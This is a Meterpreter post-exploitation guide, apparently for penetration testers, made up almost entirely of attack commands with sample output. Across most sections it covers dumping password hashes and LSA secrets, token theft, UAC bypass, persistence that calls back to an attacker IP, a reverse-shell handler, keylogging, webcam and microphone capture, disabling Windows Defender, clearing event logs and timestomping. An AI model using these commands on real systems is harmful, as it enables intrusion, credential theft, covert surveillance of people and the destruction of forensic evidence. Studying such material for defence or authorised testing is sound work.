# Meterpreter Post-Exploitation Guide

## Overview

Meterpreter is a multi-faceted, extensible payload that uses DLL injection to ensure stable connections to victim hosts. It operates entirely in memory, making it difficult to detect with conventional forensic techniques.

### Key Design Goals
- **Stealthy**: Resides in memory, writes nothing to disk
- **Powerful**: Channelized communication, AES encryption
- **Extensible**: Modular structure, runtime feature loading

### Connection Process
1. **Target executes initial stager** (bind, reverse, etc.)
2. **Stager loads DLL** with Reflective stub
3. **Meterpreter core initializes** AES-encrypted link
4. **Extensions load** (stdapi, priv if admin rights)

## System Enumeration

### Basic Information Gathering
```bash
# System information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Environment details
meterpreter > pwd
meterpreter > getenv
meterpreter > localtime
```

### Process Management
```bash
# List running processes
meterpreter > ps

# Process details with filtering
meterpreter > ps -S explorer.exe
meterpreter > ps -U SYSTEM

# Kill processes
meterpreter > kill <pid>
meterpreter > pkill <process_name>
```

### Network Information
```bash
# Network configuration
meterpreter > ipconfig
meterpreter > ifconfig

# Network connections
meterpreter > netstat
meterpreter > arp

# Route information
meterpreter > route
```

## File System Operations

### Navigation and Listing
```bash
# Directory operations
meterpreter > pwd
meterpreter > ls
meterpreter > cd <directory>
meterpreter > mkdir <directory>
meterpreter > rmdir <directory>

# File operations
meterpreter > cat <file>
meterpreter > edit <file>
meterpreter > rm <file>
meterpreter > mv <source> <destination>
meterpreter > cp <source> <destination>
```

### File Transfers
```bash
# Upload files to target
meterpreter > upload /local/path/file.txt C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\Windows\\Temp\\

# Download files from target
meterpreter > download C:\\Windows\\System32\\config\\SAM
meterpreter > download -r C:\\Users\\Administrator\\Documents\\
```

### File Search
```bash
# Search for files
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users\\
meterpreter > search -f config.xml -r
```

## Credential Harvesting

### Password Hash Extraction
```bash
# Dump password hashes (requires SYSTEM)
meterpreter > hashdump

# Advanced SAM database dump
meterpreter > lsa_dump_sam

# LSA secrets extraction
meterpreter > lsa_dump_secrets
```

### Example Output
```
Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Credential Management
```bash
# Display gathered credentials
meterpreter > creds

# Add credentials manually
meterpreter > creds -a -u username -p password

# Export credentials
meterpreter > creds -o /tmp/credentials.txt
```

## Token Manipulation

### Understanding Windows Tokens
Windows access tokens contain security information about logged-on users. Meterpreter can steal and impersonate these tokens.

### Token Operations
```bash
# List available tokens
meterpreter > use incognito
meterpreter > list_tokens -u

# Steal token from process
meterpreter > steal_token <pid>

# Impersonate token
meterpreter > impersonate_token "DOMAIN\\username"

# Revert to original token
meterpreter > rev2self
```

### Example Token Theft
```bash
meterpreter > ps
# Find interesting process (e.g., explorer.exe running as admin)
meterpreter > steal_token 1836
[+] Stolen token with username: NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Privilege Escalation

### Local Exploit Suggester
```bash
# Background current session
meterpreter > bg

# Use exploit suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

### Common Privilege Escalation Modules
```bash
# Windows escalation exploits
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > use exploit/windows/local/ms10_015_kitrap0d
```

### UAC Bypass
```bash
# UAC bypass techniques
meterpreter > use exploit/windows/local/bypassuac
meterpreter > use exploit/windows/local/bypassuac_injection
```

## Process Migration

### Why Migrate?
- **Stability**: Move from unstable process to stable one
- **Persistence**: Attach to long-running processes
- **Privileges**: Inherit target process privileges
- **Stealth**: Hide in legitimate processes

### Migration Process
```bash
# List processes
meterpreter > ps

# Migrate to target process
meterpreter > migrate <pid>

# Migrate to specific process by name
meterpreter > migrate -N explorer.exe
```

### Best Migration Targets
```bash
# Stable system processes
explorer.exe       # Windows Explorer (user context)
winlogon.exe       # Windows Logon (SYSTEM context)
services.exe       # Service Control Manager (SYSTEM)
svchost.exe        # Generic Host Process (various contexts)
```

## Persistence

### Persistence Methods
```bash
# Registry persistence
meterpreter > run persistence -X -i 10 -p 443 -r 10.10.14.113

# Service persistence
meterpreter > run persistence -S -i 10 -p 443 -r 10.10.14.113

# Startup folder persistence
meterpreter > run persistence -U -i 10 -p 443 -r 10.10.14.113
```

### Persistence Options
| Option | Description |
|--------|-------------|
| `-X` | Boot persistent (registry) |
| `-U` | User persistent (startup folder) |
| `-S` | System persistent (service) |
| `-i` | Interval between connections |
| `-p` | Port to connect back to |
| `-r` | IP to connect back to |

## Pivoting and Lateral Movement

### Route Management
```bash
# Add route to internal network
meterpreter > route add 192.168.1.0 255.255.255.0 1

# List current routes
meterpreter > route print

# Delete route
meterpreter > route delete 192.168.1.0 255.255.255.0 1
```

### Port Forwarding
```bash
# Forward local port to remote service
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# List active port forwards
meterpreter > portfwd list

# Delete port forward
meterpreter > portfwd delete -l 8080
```

### AutoRoute Module
```bash
# Background session
meterpreter > bg

# Use autoroute for automatic routing
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > run
```

## Advanced Techniques

### Screenshot and Surveillance
```bash
# Capture screenshot
meterpreter > screenshot

# Webcam operations
meterpreter > webcam_list
meterpreter > webcam_snap
meterpreter > webcam_stream

# Audio recording
meterpreter > record_mic
```

### Keystroke Logging
```bash
# Start keylogger
meterpreter > keyscan_start

# Dump captured keystrokes
meterpreter > keyscan_dump

# Stop keylogger
meterpreter > keyscan_stop
```

### Registry Operations
```bash
# Registry enumeration
meterpreter > reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -v ProductName

# Registry modification
meterpreter > reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -v TestValue -t REG_SZ -d "Test Data"

# Registry key creation
meterpreter > reg createkey -k HKLM\\SOFTWARE\\TestKey
```

## Session Management

### Multiple Sessions
```bash
# List active sessions
meterpreter > sessions

# Interact with specific session
meterpreter > sessions -i 2

# Kill session
meterpreter > sessions -k 1

# Background current session
meterpreter > background
```

### Session Persistence
```bash
# Create persistent handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.113
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > exploit -j
```

## Scripting and Automation

### Meterpreter Scripts
```bash
# Run built-in scripts
meterpreter > run checkvm
meterpreter > run get_application_list
meterpreter > run get_local_subnets
meterpreter > run winenum
```

### Resource Scripts
```bash
# Create resource script
echo "sysinfo" > /tmp/enum.rc
echo "getuid" >> /tmp/enum.rc
echo "ps" >> /tmp/enum.rc

# Run resource script
meterpreter > resource /tmp/enum.rc
```

### Post-Exploitation Modules
```bash
# System enumeration
msf6 > use post/windows/gather/enum_system
msf6 > use post/windows/gather/credentials/windows_autologin

# Network enumeration
msf6 > use post/windows/gather/enum_shares
msf6 > use post/windows/gather/enum_computers
```

## Evasion Techniques

### Anti-Virus Evasion
```bash
# Migrate to whitelisted process
meterpreter > migrate -N explorer.exe

# Disable Windows Defender
meterpreter > execute -f powershell.exe -a "Set-MpPreference -DisableRealtimeMonitoring $true" -H
```

### Forensic Evasion
```bash
# Clear event logs
meterpreter > clearev

# Timestomp files
meterpreter > timestomp C:\\Windows\\System32\\calc.exe -v
meterpreter > timestomp C:\\Windows\\System32\\calc.exe -f C:\\Windows\\System32\\notepad.exe
```

## Best Practices

### Operational Security
1. **Migrate quickly** to stable processes
2. **Use HTTPS handlers** for encrypted communication
3. **Avoid detection** by limiting system changes
4. **Clean up artifacts** after operations
5. **Document all actions** for reporting

### Session Stability
1. **Choose stable migration targets**
2. **Set appropriate timeouts**
3. **Use multiple persistent handlers**
4. **Monitor session health**

### Performance Optimization
1. **Use staged payloads** for smaller initial footprint
2. **Compress large file transfers**
3. **Limit concurrent operations**
4. **Use appropriate transport mechanisms**

## Common Issues and Troubleshooting

### Session Drops
- **Cause**: Unstable process, network issues
- **Solution**: Migrate to stable process, use persistent handlers

### Permission Denied
- **Cause**: Insufficient privileges
- **Solution**: Token manipulation, privilege escalation

### AV Detection
- **Cause**: Behavioral analysis, signature detection
- **Solution**: Process migration, encryption, evasion techniques

### Network Restrictions
- **Cause**: Firewall, IDS/IPS blocking
- **Solution**: Alternative transport methods, port forwarding

## Integration with Other Tools

### Mimikatz Integration
```bash
# Load mimikatz extension
meterpreter > load mimikatz

# Dump credentials
meterpreter > msv
meterpreter > kerberos
meterpreter > wdigest
```

### PowerShell Integration
```bash
# Load PowerShell extension
meterpreter > load powershell

# Execute PowerShell commands
meterpreter > powershell_shell
meterpreter > powershell_execute "Get-Process"
```

This comprehensive guide provides the foundation for effective post-exploitation using Meterpreter while maintaining operational security and achieving assessment objectives. 